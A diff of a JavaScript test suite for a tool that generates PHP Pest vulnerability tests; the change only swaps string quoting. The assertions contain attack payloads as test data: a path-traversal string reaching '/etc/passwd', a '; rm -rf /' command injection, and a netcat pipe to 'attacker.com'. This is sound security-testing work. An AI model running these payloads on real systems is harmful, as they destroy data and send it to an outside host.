@@ -170,11 +170,11 @@ describe('AdaptiveTestGenerator - PHP Framework Support', () => {
       expect(result.success).toBe(true);
       expect(result.framework).toBe('pest');
       // RFC-060: Pest generates RED-only tests
-      expect(result.testCode).toContain("it('should be vulnerable to path_traversal");
+      expect(result.testCode).toContain('it(\'should be vulnerable to path_traversal');
       expect(result.testCode).toContain('beforeEach(function ()');
       expect(result.testCode).toContain('use App\\FileHandler');
       // Should include dataset for path traversal attacks
-      expect(result.testCode).toContain("dataset('path_traversal_payloads'");
+      expect(result.testCode).toContain('dataset(\'path_traversal_payloads\'');
       expect(result.testCode).toContain('../../../etc/passwd');
       // Should use Pest expectations
       expect(result.testCode).toContain('expect($result)');
@@ -213,11 +213,11 @@ describe('AdaptiveTestGenerator - PHP Framework Support', () => {
 
       expect(result.success).toBe(true);
       // RFC-060: Pest generates RED tests with datasets for attack vectors
-      expect(result.testCode).toContain("dataset('malicious_commands', [");
-      expect(result.testCode).toContain("; rm -rf /");
+      expect(result.testCode).toContain('dataset(\'malicious_commands\', [');
+      expect(result.testCode).toContain('; rm -rf /');
       expect(result.testCode).toContain('| nc attacker.com 1234');
       // RED test checks vulnerability exists
-      expect(result.testCode).toContain("it('should be vulnerable to command_injection");
+      expect(result.testCode).toContain('it(\'should be vulnerable to command_injection');
       expect(result.testCode).toContain('$maliciousInput');
     });
 
@@ -259,9 +259,9 @@ describe('AdaptiveTestGenerator - PHP Framework Support', () => {
 
       expect(result.success).toBe(true);
       expect(result.testCode).toContain('uses(RefreshDatabase::class)');
-      expect(result.testCode).toContain("beforeEach(function ()");
-      expect(result.testCode).toContain("$this->artisan('migrate')");
-      expect(result.testCode).toContain("it('should be vulnerable to security_misconfiguration");
+      expect(result.testCode).toContain('beforeEach(function ()');
+      expect(result.testCode).toContain('$this->artisan(\'migrate\')');
+      expect(result.testCode).toContain('it(\'should be vulnerable to security_misconfiguration');
       expect(result.testCode).toContain('post(\'/api/vulnerable\'');
       expect(result.testCode).toContain('expect($response->json())');
     });
